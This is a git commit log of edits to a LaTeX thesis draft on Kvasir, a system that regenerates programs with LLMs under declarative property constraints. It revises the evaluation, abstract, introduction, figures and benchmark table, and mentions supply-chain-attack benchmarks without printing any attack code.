-\gptmodel was successful in eliminating the original attacks, but failed in \emph{all} 
-cases where the source code was particularly crafted to appear secure, regenerating both 
-the original functionality and the attack.
-For the IOCCC benchmarks, \gptmodel also fails 
-in both cases to regenerate the programs in a way where the code's 
-functionality is preserved while removing the obfuscation.
-The \ttt{adder} program is regenerated as a program that prints the \ttt{argc} argument, 
-while the \ttt{mersenne} program performs irrelevant arithmetic operations that 
-resemble the original source, and fails to even compile.
-For the microbenchmarks, \gptmodel is able to regenerate the \ttt{flatmap-stream} program, but fails to produce a Haskell version of it,
-as it over-fits to the original JavaScript source code which uses the \ttt{Stream} API,
-and fails to produce a Haskell program that is nor equivalent to the original, nor idiomatic.
-For the \ttt{Q\_rsqrt} program, \gptmodel fails to produces a program that idiomatically 
-computes the inverse square root, rather trying to minimize the number of lines in the program
-by removing constants and comments and still keeping the bit-level manipulation.
-Finally, for the \ttt{rigidDB} program, \gptmodel is able to decompose the original program into two functions
-and names them \ttt{setupDatabase} and \ttt{getAlbumsByArtist}.
-
-\sys consistently outperforms a \gptmodel baseline,
-overcoming the inherent weaknesses of a purely prompt-based approach.
-
-\subsection{Q3: Planning Efficiency \& Precision}
-
-To evaluate the impact of \sys's property planning, we compare it against a \gptmodel baseline that performs prompt-only rewriting without explicit access to guiding properties.
-
-We consider two criteria for each regenerated program:
-
-\begin{itemize}
-  \item \textbf{Wanted Property Satisfaction:} Does the output program satisfy all positive properties declared in the query (\eg \texttt{pure}, \texttt{language(haskell)})?
-  \item \textbf{Unwanted Property Avoidance:} Does the output avoid introducing disallowed behaviors (\eg side effects, global state, unsupported language features)?
-\end{itemize}
-
-\sys consistently satisfies more of the declared properties while avoiding
-unintended behaviors.
-Following is a qualitative analysis of the results.
-In the \texttt{flatmap-stream} benchmark,
-\gptmodel often inclduded malicious side effects when the code appeared innocuous,
-whereas \sys generated pure rewrites by treating the source as
-untrusted and grounding regeneration in I/O behavior alone.
-Across all benchmarks, the planning step completes in under 50ms on average.
-Similarly, in the \ttt{Q\_rsqrt} benchmark, \gptmodel often produces bit-level
-manipulations that are not idiomatic in Haskell, while \sys generates a simple
-and idiomatic Haskell function that computes the inverse square root.
-This is guided by the fact the \sys extracts and provides to its backend model only the function signature 
-and length of the program, which it minimizes, without including the original source code,
-which as shown in the experimental results makes the model over-fit its regeneration to it.
-\sys's I/O pair extraction also provides confidence that 
-the regenerated program has the same client-visible behavior as the original one, while 
-prompting a model like \gptmodel would always require manual inspection or the presence 
-of developer tests to verify the correctness of the regeneration.
+\subsection{Correctness and Functional Equivalence}
+
+Overall, \sys regenerated correct code in most cases.
+All Rosetta Code and utility tasks were completed successfully.
+For supply-chain attacks, \sys removed malicious behaviors while preserving legitimate functionality, confirming that treating the original source as untrusted can be effective.
+
+Regeneration was less reliable in obfuscated C programs: one IOCCC entry was successfully simplified, while another failed due to incomplete semantic understanding and inconsistent output formatting.
+
+In microbenchmarks, \sys generated idiomatic rewrites (e.g., replacing unsafe inverse square root implementations with standard library calls) while maintaining observable behavior.
+
+\subsection{Impact of Property-Guided Synthesis}
+
+A key observation is that constraining the synthesizer to operate only over extracted properties significantly improved reliability.
+For example, when regenerating modules with hidden side effects, naive prompting often reproduced those side effects verbatim.
+By contrast, \sys’s selective extraction of I/O traces and signatures avoided this overfitting.
+
+Prompt size was also reduced substantially (up to 60\%), and synthesis iterations converged faster.
+
+\subsection{Comparison to Naive Prompting}
+
+As a baseline, we prompted a large language model with the full source code and a natural language description of the task.
+For simple translation and trivial refactoring, this approach often succeeded.
+However, it frequently failed in cases requiring property preservation without leaking implementation details.
+
+For example, in the malicious supply-chain benchmarks, naive prompting preserved obfuscated credential exfiltration in regenerated code, whereas \sys consistently eliminated it.
 
@@
 \section{Related Work}
-
-% \begin{table*}
-%   \centering
-%   \caption{
-%     \textbf{Comparison of transformation paradigms.}
-%     \sys combines symbolic planning, property reasoning, and guided regeneration.
-%   }
-%   \label{tbl:comparison}
-%     \begin{tabular}{lcccccccc}
-% \toprule
-% \textbf{Approach} & 
-% \rotatebox{90}{\textbf{Uses Input}} &
-% \rotatebox{90}{\textbf{Decl. Goals}} &
-% \rotatebox{90}{\textbf{Neg. Const.}} &
-% \rotatebox{90}{\textbf{Opt. Support}} &
-% \rotatebox{90}{\textbf{Modular}} &
-% \rotatebox{90}{\textbf{Explainable}} &
-% \rotatebox{90}{\textbf{Scoped}} & 
-% Source \\
-% \midrule
-% Classical Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{alur2013sygus, solar2008sketch} \\
-% Refactoring Tools & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squadfillhr$ & $\squadfillhr$ & \cite{} \\
-% PBE Synthesis & $\squad$ & $\squadfill$ & $\squad$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
-% CEG Synthesis & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squad$ & $\squad$ & $\squad$ & \cite{solar2008sketch} \\
-% Pure LLMs & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & $\squad$ & \cite{} \\
-% \textbf{\sys} & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & $\squadfill$ & (this paper) \\
-% \bottomrule
-% \end{tabular}
-% \end{table*}
 
@@
 
-Here, I outline some possible future directions for \sys and its successors:
-
-\heading{Expanding the transformation space}
-Future extensions to \sys may incorporate richer classes of properties, such as
-temporal logic and dataflow
-constraints~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}.
-In addition, performance-guided transformations offer a compelling avenue: \sys
-could optimize for runtime, memory usage, or even parallelizability.
-Inverse
-transformations, such as serializing parallel programs, could serve as
-a debugging or oracle mechanism in complex system settings.
-
-\heading{Formal foundations and alternative implementations}
-The transformation semantics introduced by \sys are grounded in logic
-programming and inherit properties like compositionality.
-A more formal treatment of the \sys
-transformation language could enable rigorous reasoning about transformation
-correctness and equivalence.
-Furthermore, establishing an abstract interface
-over transformations would allow alternative \sys backends to be developed.
-Integrating techniques from
-counterfactual reasoning~\cite{Cabalar_2020} could further enhance \sys by
-explaining synthesis failures and clarifying conflicting property constraints.
-
-\heading{Regeneration as a system-building primitive}
-Beyond isolated transformations, \sys can serve as a core building block for
-higher-level systems.
-For instance, a reverse-engineering pipeline for
-proprietary or legacy systems could use \sys to regenerate and recompose
-well-behaved modules such as networking layer or the physics engine into new,
-repurposed applications.
-The vision here is \sys as a foundation for automated system understanding, adaptation, and re-imagination.
-
-\heading{Challenges in cross-language regeneration}
-Cross-language regeneration introduces challenges.
-Some analyses and
-properties may only be applicable in a subset of languages, or lack direct
-equivalents across language boundaries.
-\sys could address this in two ways: by
-relying on least-common denominator of language semantics, or by
-embracing language-specific features to drive more effective regeneration.
-In
-fact, cross-compilation could be leveraged as an asset: a plugin pipeline might
-convert JavaScript to Haskell, extract formal properties via Haskell’s type
-system, and then regenerate a more robust JavaScript variant informed by that
-analysis---effectively using \sys recursively.
-
-\heading{Ethical and legal considerations}
-While this work has applied \sys exclusively to open-source software, its
-capabilities raise ethical and legal questions. Regenerating
-proprietary software, de-obfuscating binaries, or reimplementing licensed
-systems into equivalent ones with more permissive licensing 
-could challenge existing norms and
-regulations. 
-It is important to consider
-safeguards and responsible disclosure practices towards ethical program regeneration.
+% Here, I outline some possible future directions for \sys and its successors:
+
+% \heading{Expanding the transformation space}
+% Future extensions to \sys may incorporate richer classes of properties, such as
+% temporal logic and dataflow
+% constraints~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}.
+% In addition, performance-guided transformations offer a compelling avenue: \sys
+% could optimize for runtime, memory usage, or even parallelizability.
+% Inverse
+% transformations, such as serializing parallel programs, could serve as
+% a debugging or oracle mechanism in complex system settings.
+
+% \heading{Formal foundations and alternative implementations}
+% The transformation semantics introduced by \sys are grounded in logic
+% programming and inherit properties like compositionality.
+% A more formal treatment of the \sys
+% transformation language could enable rigorous reasoning about transformation
+% correctness and equivalence.
+% Furthermore, establishing an abstract interface
+% over transformations would allow alternative \sys backends to be developed.
+% Integrating techniques from
+% counterfactual reasoning~\cite{Cabalar_2020} could further enhance \sys by
+% explaining synthesis failures and clarifying conflicting property constraints.
+
+% \heading{Regeneration as a system-building primitive}
+% Beyond isolated transformations, \sys can serve as a core building block for
+% higher-level systems.
+% For instance, a reverse-engineering pipeline for
+% proprietary or legacy systems could use \sys to regenerate and recompose
+% well-behaved modules such as networking layer or the physics engine into new,
+% repurposed applications.
+% The vision here is \sys as a foundation for automated system understanding, adaptation, and re-imagination.
+
+% \heading{Challenges in cross-language regeneration}
+% Cross-language regeneration introduces challenges.
+% Some analyses and
+% properties may only be applicable in a subset of languages, or lack direct
+% equivalents across language boundaries.
+% \sys could address this in two ways: by
+% relying on least-common denominator of language semantics, or by
+% embracing language-specific features to drive more effective regeneration.
+% In
+% fact, cross-compilation could be leveraged as an asset: a plugin pipeline might
+% convert JavaScript to Haskell, extract formal properties via Haskell’s type
+% system, and then regenerate a more robust JavaScript variant informed by that
+% analysis---effectively using \sys recursively.
+
+% \heading{Ethical and legal considerations}
+% While this work has applied \sys exclusively to open-source software, its
+% capabilities raise ethical and legal questions. Regenerating
+% proprietary software, de-obfuscating binaries, or reimplementing licensed
+% systems into equivalent ones with more permissive licensing 
+% could challenge existing norms and
+% regulations. 
+% It is important to consider
+% safeguards and responsible disclosure practices towards ethical program regeneration.
 
@@
 \begin{listing}[htpb]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 'use strict';
@@
 \begin{listing}[htpb]
-  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+  \begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 function leftPad(str, len, ch) {
@@
 \begin{listing}[htpb]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{c}
 float Q_rsqrt( float number )
@@
 \begin{listing}[p]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{c}
 #include <stdint.h> // For using int32_t
@@
 \begin{listing}[p]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{c}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{c}
 float Q_rsqrt(float number) {
@@
 \begin{listing}[htpb]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 // (a === b)? 0 : ((a < b)?  -1: 1)
@@
 \begin{listing}[p]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 const fs = require('fs');
@@
 \begin{listing}[H]
-\begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+\begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 const fs = require('fs');
@@
 \begin{listing}[H]
-  \begin{minted}[fontsize=\footnotesize, frame=lines, framesep=2mm, breaklines=true]{javascript}
+  \begin{minted}[fontsize=\footnotesize, , framesep=2mm, breaklines=true]{javascript}
 function stringCompare(a, b) { return a.localeCompare(b); }

### 2025-07-16 docs/plos/draft.tex
Rework figs
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \section{Introduction}
+% \begin{figure}[t]
+%   % https://docs.google.com/drawings/d/1LAmdVYjfAID24eSM-hl5PRhVg9fRMJMWYETsvvcyAuU/edit?usp=sharing
+%   \includegraphics[width=.9\columnwidth]{figs/kvasir_overview.pdf}
+%   \caption{\textbf{\sys overview}
+% Given a transformation query, and a source program, \sys extracts a minimal set
+%   of properties,
+%   guided by a logic engine and knowledge base.
+%   It then synthesizes a new program $P'$ that satisfies the query, verifying
+%   that wanted properties are present and unwanted properties are absent in $P'$.
+% }
+%   \label{fig:overview}
+% \end{figure}
+
 \begin{figure}[t]
-  % https://docs.google.com/drawings/d/1LAmdVYjfAID24eSM-hl5PRhVg9fRMJMWYETsvvcyAuU/edit?usp=sharing
-  \includegraphics[width=.9\columnwidth]{figs/kvasir_overview.pdf}
+  % https://docs.google.com/drawings/d/1ozMu2B0RUhyLWC_rM6GLBrioov80-M06CBqYRAhCk18/edit
+  \includegraphics[width=.9\columnwidth]{figs/kvasir_projection.pdf}
   \caption{\textbf{\sys overview}
@@
 }
-  \label{fig:overview}
+  \label{fig:projection}
 \end{figure}
@@
 language, trace equivalence, or modular structure.
-As shown in \cref{fig:overview}, given a source program and
+Given a source program and
 a query, \sys extracts a minimal set of relevant properties, guided by a
@@
 \centering
-  \includegraphics[width=.9\columnwidth]{example-image-a}
-  \caption{\textbf{Applying \sys to a complex application}}
+  % https://docs.google.com/drawings/d/1zMcTurJ8twCG4BrkSUAJersbNSl5UQkogHqqg88vG9M/edit
+  \includegraphics[width=.9\columnwidth]{figs/kvasir_application.pdf}
+  \caption{\textbf{Applying \sys to a complex game application.}
+  The high level of modularity present in modern applications allows \sys to be applied effectively across a codebase.
+  Edges signify logical dependencies between components 
+  and shaded vertices signify parts of the codebase \sys is applied as part of the example~(\cref{sec:example}).
+  Dotted edges signify ommited layers of dependencies.
+  }
   \label{fig:ex-large-app}
@@
 that relies on undefined behavior and reduces portability:
+\begin{listing}
 \begin{minted}{c}
@@
 \end{minted}
+\caption{An unidiomatic C implementation of the fast inverse square root function popularized by the game Quake III~\cite{fast_inv_sqrt}.}
+\end{listing}
 The following query for \sys uses lines of code as a coarse metric of

### 2025-07-17 docs/plos/draft.tex
Update intro and examples
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \begin{abstract}
-Modern software systems are constantly evolving—requiring developers to
-  refactor legacy code, adapt to changing APIs, translate across languages, and
-  patch security vulnerabilities. These transformations are often brittle,
-  manual, and error-prone. Large language models (LLMs) offer new opportunities
-  for automating such tasks, but their outputs are shaped by surface cues, lack
-  semantic guarantees, and require brittle prompting strategies. This paper
-  presents \sys, a system for controllable program regeneration that combines
-  logic-based planning with LLM-guided synthesis.
-Kvasir operates in four stages: (1) a symbolic planner constructs a
-transformation plan using logic rules and a domain-aware knowledge base; (2)
-property extractors analyze the input program to gather relevant semantic
-information; (3) a language model synthesizes candidate programs guided by
-a structured prompt assembled from extracted properties; and (4) a verification
-and feedback loop checks whether the output meets the desired properties and
-iteratively refines the generation process through additional feedback.
+  Software evolution tasks---like security hardening, porting critical components to safer 
+  languages, or refactoring opaque legacy code---are time-consuming and brittle.
+  Large language models (LLMs) have shown promise in automating such tasks,
+  but their outputs are shaped by surface cues, lack
+  semantic guarantees, and their usage often boil down to brittle prompting strategies.
+This paper presents \sys, a system for controllable program regeneration that
+  combines declarative property constraints with LLM-guided synthesis. Unlike
+  prior approaches, \sys treats the input program as an untrusted artifact and
+  explicitly projects it into a minimal set of verifiable properties, such as
+  input/output behavior, execution traces, and API signatures. These properties
+  serve as constraints during synthesis and are checked post hoc to ensure
+  correctness.
 \sys is evaluated on a diverse set of program transformation tasks
 including security hardening, language translation, idiomatic rewriting, de-obfuscation,
-and modular refactoring.
-Target programs are sourced from high-profile supply-chain attacks, 
-online repositories, programming competitions, and real-world software projects.
-\sys produces high-quality outputs that satisfy goals in all but two cases,
-even on instances where a state-of-the-art LLM fails to do so.
+and modular refactoring showing strong results, even on tasks where state-of-the-art LLMs fail.
 \end{abstract}
+
 \maketitle
@@
   \includegraphics[width=.9\columnwidth]{figs/kvasir_projection.pdf}
-  \caption{\textbf{\sys overview}
-Given a transformation query, and a source program, \sys extracts a minimal set
-  of properties,
-  guided by a logic engine and knowledge base.
-  It then synthesizes a new program $P'$ that satisfies the query, verifying
-  that wanted properties are present and unwanted properties are absent in $P'$.
-}
+  \caption{\textbf{Property projection and verifiable regeneration in \sys.}
+  Instead of transforming source code directly, \sys projects the original
+  program into a minimal set of verifiable properties---such as input/output
+  examples, system call traces, \etc.
+  These properties serve as declarative
+  constraints for synthesis.
+  The regenerated implementation is then checked to
+  ensure it satisfies the specified properties, providing a verifiable
+  foundation for trust unlike purely prompt-based LLM workflows.}
   \label{fig:projection}
@@
 
-Recent advances in large language models (LLMs) have opened new possibilities for automating program transformation and synthesis tasks, making them attractive tools for software evolution, albeit with caveats.
+Recent advances in natural-language processing, particularly large language
+models (LLMs) have opened new possibilities for automating program
+transformation and synthesis tasks,
+making them attractive tools for software
+evolution, albeit with caveats.
 This flexibility has positioned them as attractive tools for software evolution
@@
 As a result, developers must prompt and steer them through brittle heuristics or manual trial-and-error, leading to workflows that are difficult to audit, integrate, or systematically reason about.
-Bridging this gap calls for a declarative interface---one that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
-
-This paper present \sys, a system for \emph{property-guided program regeneration}.
+Bridging this gap calls for an that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
+
+This paper explores the feasibility of combining declarative property
+constraints with LLM-based synthesis to support \emph{property-guided program regeneration}.
+The key idea is to treat the original program as an untrusted reference from
+which to extract minimal, verifiable properties (\eg I/O behavior,
+function signatures, program traces), and to synthesize a new implementation that satisfies those
+constraints without overfitting to potentially spurious details of the original source code.
+The engine for this experimentation is the \sys prototype.
 \sys allows users
 to express transformation goals declaratively, as logical constraints over
-program properties such as input/output behavior, side-effect freedom, target
-language, trace equivalence, or modular structure.
-Given a source program and
-a query, \sys extracts a minimal set of relevant properties, guided by a
-logic engine and a domain-specific knowledge base, and synthesizes a new
-program that satisfies the desired constraints.
+program properties.
+At a high level, given a source program and a query, \sys uses the provided
+logical constraints and its internal knowledge base to extract a set of
+feasible and relevant program properties.
+It then prompts an LLM to synthesize
+candidate programs, which are subsequently verified against the desired properties.
+This approach treats program transformation as projecting the original program over key properties.
+Intuitively, regeneration then leverages LLM's high-dimensional internal representation~\cite{jin2024emergent,tao2024llms,huh2024platonicrepresentationhypothesis}, 
+which lifts the projection back to a concrete implementation~(\cref{fig:projection}).
+Unlike prompt-based approaches that require
+extensive curation of examples~\cite{dilhara2024unprecedented, khattab2023dspy, cummins2024donttransformcodecode},
+\sys treats the input program as an
+untrusted artifact and explicitly projects only minimal, verifiable properties
+into the regeneration process.
 
 Three key insights shape the design of \sys.
-First, modern software is highly modular, making it feasible to reason about transformations at the granularity of individual components or functions.
-Second, the program regeneration setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
-Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface that harnesses this progress without disrupting the framework's end user.
-
-Guided by these insights, \sys casts transformation as a constrained synthesis problem.
-At its core is a property-driven pipeline: users express goals as logical constraints over semantic properties, such as input/output behavior, side-effect freedom, target language, or structural modularity.
-\sys extracts a set of relevant properties, derived from its logic engine and a domain-aware knowledge base, and synthesizes a new program that satisfies the specified constraints.
-If no such program exists, \sys returns a failure explanation from the unsatisfiable core.
+First, modern software is highly decomposable~\cite{vfunction2024modular, isoline2018decomposition, schechter2011visualizing, breakapp:ndss:2018}, making it feasible to reason about transformations at the granularity of individual modules, libraries, or functions.
+Second, the program \emph{regeneration} setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
+Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface harnesses this progress without disrupting the framework's end user.
+
+% Guided by these insights, \sys casts transformation as a constrained synthesis problem.
+% At its core is a property-driven pipeline: users express goals as logical constraints over semantic properties, such as input/output behavior, side-effect freedom, target language, or structural modularity.
+% \sys extracts a set of relevant properties, derived from its logic engine and a domain-aware knowledge base, and synthesizes a new program that satisfies the specified constraints.
+% If no such program exists, \sys returns a failure explanation from the unsatisfiable core.
 
@@
 It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
-It can also assist during development, for instance when integrating third-party modules that must be adapted to local conventions or hardened against security vulnerabilities.
+It can also assist during development, for instance when integrating
+third-party modules that must be adapted to local conventions or hardened
+against security vulnerabilities.
+For example, a developer can regenerate a C library as idiomatic
+JavaScript while preserving I/O equivalence, or decompose a monolithic function
+into modular components suitable for sandboxing.
 However, \sys is not designed for whole-program synthesis or large-scale migrations.
 Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module---where transformation goals can be explicitly stated and verified in isolation.
-To this end, \sys functions not only as a standalone tool but also as a
+To this end, \sys can function not only as a standalone tool but also as a
 library, where other components can invoke it as a programmable,
@@
 % (3) towards the generality and longevity of this solution the interface needs to be purely declarative, to allow independent progress of the underlying components to give automatic benefits
+
+\heading{Contributions}
+The paper's contributions are:
+\begin{itemize}
+ \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
+ \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
+ \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
+ \item An empirical evaluation demonstrating \sys's feasibility across transformation scenarios~(\cref{sec:evaluation}).
+\end{itemize}
 
@@
 
-We illustrate the capabilities of \sys by applying it to a representative game
+This examples illustrates the capabilities of \sys by applying it to a representative game
 application.
@@
 and structural refactoring.
-
-In each case, \sys first selects a minimal set of properties to extract from
-the original program, guided by the transformation query and the
-domain-specific knowledge base.
-It then synthesizes a new program that
-satisfies the declarative constraints while preserving the original
-program's behavior to the extend expressible by the extracted properties.
 
@@
 preserving observable behavior over a representative set of numeric inputs:
-\begin{wrapfigure}[3]{r}{.7\columnwidth}
+\begin{wrapfigure}[3]{r}{.65\columnwidth}
   \vspace{-5pt}
@@
 Consider a JavaScript function in the game's scripting environment that
-retrieves and displays a player's saved inventory from a local SQLite database.
+retrieves and displays a player's saved inventory from a local SQLite database~(\cref{listing:monolithic-sql}).
 The function combines database initialization and query execution in a single
@@
 
+\begin{listing}
 \begin{minted}{javascript}
@@
 \end{minted}
+\caption{A monolithic function that retrieves a player's inventory from a SQLite database.}
+\label{listing:monolithic-sql}
+\end{listing}
 
@@
 
-\begin{wrapfigure}[6]{r}{.66\columnwidth}
+\begin{wrapfigure}[7]{r}{.68\columnwidth}
   \begin{minted}{prolog}
 db('game.db').func(f1).func(f2).
-sql_trc(p_,I,T):-sql_trc(p,I,T),
+sql_trc(p_,I,T) :- sql_trc(p,I,T),
                    graph(p,I,_).
@@
 A total
-of six plugins (\ttt{input}, \ttt{graph}, \ttt{signature}, \ttt{pure}, \ttt{trace\_sql}, and \ttt{javascript2haskell})
+of six property extraction/verification plugins (\ttt{graph}, \ttt{fsignt}, \ttt{sql\_trc}, and \ttt{llm\_translate})
 were required to perform the above transformations, each
@@
 \cite{Gelfond_2000, Gelfond_2002, Eiter_2009}. 
-ASP has been used for
+Paradigms like ASP have been used for
 declarative program analysis \cite{benton2007interactive}, automated planning
@@
 
-\heading{Targeted regeneration}
-\sys is best used as a surgical tool for targeted regeneration tasks, not for whole-program synthesis or full language migration.
-It operates most effectively on localized units of code---such as individual functions, methods, or small modules, where behavior is self-contained and transformation goals can be expressed through explicit constraints.
-% Typical applications include rewriting high-risk, deprecated, or poorly understood code segments where correctness is critical and semantic preservation is essential.
-Broad use may yield incomplete results and can be bottlenecked by the limited context of the back-end model \sys uses.
-
 \heading{Dependence on property specification}
 The system relies heavily on the quality and granularity of extracted or declared properties.
-In cases where desired behaviors cannot be easily expressed using available predicates, or where plugins fail to extract meaningful constraints, the regeneration plan may be under-constrained, leading to brittle or incorrect outputs.
-The framework is extensible, but each new property class requires the development of a new plugin that will provide a set of pre- and post-conditions, an extractor, and a verifier.
+In cases where desired behaviors cannot be easily expressed using available
+predicates, or where plugins fail to extract meaningful constraints, the
+regeneration plan may be under-constrained, leading to brittle or incorrect
+outputs. The framework is extensible, but each new property class requires the
+development of a new plugin that will provide a set of pre- and
+post-conditions, an extractor, and a verifier.
 

### 2025-07-17 docs/plos/draft.tex
Small fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\heading{Contributions}
-The paper's contributions are:
-\begin{itemize}
- \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
- \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
- \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
- \item An empirical evaluation demonstrating \sys's feasibility across transformation scenarios~(\cref{sec:evaluation}).
-\end{itemize}
+% \heading{Contributions}
+% The paper's contributions are:
+% \begin{itemize}
+%  \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
+%  \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
+%  \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
+%  \item An empirical evaluation demonstrating \sys's feasibility across transformation scenarios~(\cref{sec:evaluation}).
+% \end{itemize}
 
@@
 \end{listing}
-The following query for \sys uses lines of code as a coarse metric of
+The query to the right uses lines of code as a coarse metric of
 idiomaticity. \sys regenerates the program, minimizing this metric while
-preserving observable behavior over a representative set of numeric inputs:
-\begin{wrapfigure}[3]{r}{.65\columnwidth}
-  \vspace{-5pt}
+preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
+\begin{wrapfigure}[4]{r}{.7\columnwidth}
   \begin{minted}{prolog}

### 2025-07-17 docs/paper/draft.tex
Fix title and add LoC
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
-\documentclass[noacm,sigplan,review]{acmart}
+\documentclass[nonacm,sigplan,review]{acmart}
 
@@
 
-\title{\sys: Controllable Program Regeneration}
-\author{Evangelos Lamprou}
+\title[Controllable Program Regeneration]{\sys: Controllable Program Regeneration\\{\vspace{1em}\normalsize DTU MSc Thesis \\ Advisors: Christian Gram Kahlauge and Nikos Vasilakis}}
+\author[Evangelos Lamprou]{Evangelos Lamprou}
 
@@
 
-% add figure
-\begin{figure}[htpb]
+\begin{figure}[t]
 \centering
@@
 \midrule
-Rosetta Code                       & Simple tasks       & 16 &      & Translation            & \cite{rosettacode} \\
-Short utilities                    & npm/PyPi utilities & 13 &      & Parity                 & \cite{regbench2025} \\
-SSCA                               & Sneaky supply-chain attacks        & 3  &      & Attack elimination     & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
-IOCCC                              & Obfuscated C code       & 2  &      & De-obfuscation         & \cite{ioccc} \\
+Rosetta Code                       & Simple tasks                             & 16 & 120 & Translation            & \cite{rosettacode} \\
+Short utilities                    & npm/PyPi utilities                       & 13 & 1079& Parity                 & \cite{regbench2025} \\
+SSCA                               & Sneaky supply-chain attacks              & 3  & 1019& Attack elimination     & \cite{ev:eurosec:2022, ohm2020backstabber,copeland2019frightening} \\
+IOCCC                              & Obfuscated C code                        & 2  & 195 & De-obfuscation         & \cite{ioccc} \\
 Microbenchmarks                    &                                          & 3  &     &                        & \\
-\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility   &    &      & Purity and translation & \cite{es1}  \\
-\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function       &    &      & Idiomatic rewrite      & \cite{fast_inv_sqrt}  \\
-\hspace{.5em} \textsf{rigidDB}     & Fetch artist songs from a music database     &    &      & Modularization         & \cite{codewithsadeemusicplayer} \\
+\hspace{.5em} \ttt{flatmap-stream} & Flat-map utility                         &    & 214 & Purity and translation & \cite{es1}  \\
+\hspace{.5em} \ttt{Q\_rsqrt}       & Inverse square root function             &    & 16  & Idiomatic rewrite      & \cite{fast_inv_sqrt}  \\
+\hspace{.5em} \textsf{rigidDB}     & Fetch artist songs from a music database &    & 33  & Modularization         & \cite{codewithsadeemusicplayer} \\
 \midrule
-Total                              &                    & 37 &      &                        & \\
+Total                              &                                          & 37 & 2676&                        & \\
 \bottomrule

### 2025-07-17 docs/paper/draft.tex
Fixes to thesis text
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \begin{abstract}
-Modern software systems are constantly evolving—requiring developers to
-  refactor legacy code, adapt to changing APIs, translate across languages, and
-  patch security vulnerabilities. These transformations are often brittle,
-  manual, and error-prone. Large language models (LLMs) offer new opportunities
-  for automating such tasks, but their outputs are shaped by surface cues, lack
-  semantic guarantees, and require brittle prompting strategies. This paper
-  presents \sys, a system for controllable program regeneration that combines
-  logic-based planning with LLM-guided synthesis.
-Kvasir operates in four stages: (1) a symbolic planner constructs a
-transformation plan using logic rules and a domain-aware knowledge base; (2)
-property extractors analyze the input program to gather relevant semantic
-information; (3) a language model synthesizes candidate programs guided by
-a structured prompt assembled from extracted properties; and (4) a verification
-and feedback loop checks whether the output meets the desired properties and
-iteratively refines the generation process through additional feedback.
+  Software evolution tasks---like security hardening, porting critical components to safer 
+  languages, or refactoring opaque legacy code---are brittle and time-consuming.
+  Large language models (LLMs) have shown promise in automating such tasks,
+  but their outputs are shaped by surface cues, lack
+  semantic guarantees, and their usage often boil down to brittle prompting strategies.
+This paper presents \sys, a system for controllable program regeneration that
+  combines declarative property constraints with LLM-guided synthesis. Unlike
